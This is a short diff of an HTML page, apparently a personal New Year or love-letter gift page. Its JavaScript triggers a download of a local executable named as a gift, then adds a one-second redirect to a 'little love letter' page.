@@ -82,11 +82,19 @@
             const link = document.createElement('a');
             link.href = '新年礼物/我会一直陪着你.exe'; // 替换为你的文件路径
             link.download = '陪你.exe'; // 指定下载的文件名
+
             document.body.appendChild(link);
             link.click(); // 模拟点击
             document.body.removeChild(link); // 移除链接
+
+            // 无论下载失败或成功，1秒后跳转到指定网站
+            setTimeout(function() {
+                window.location.href = '小情书.html'; // 替换为你要跳转的网站
+            }, 1000); // 1秒后跳转
         }
     </script>
+
+
 </body>
 </html>
 
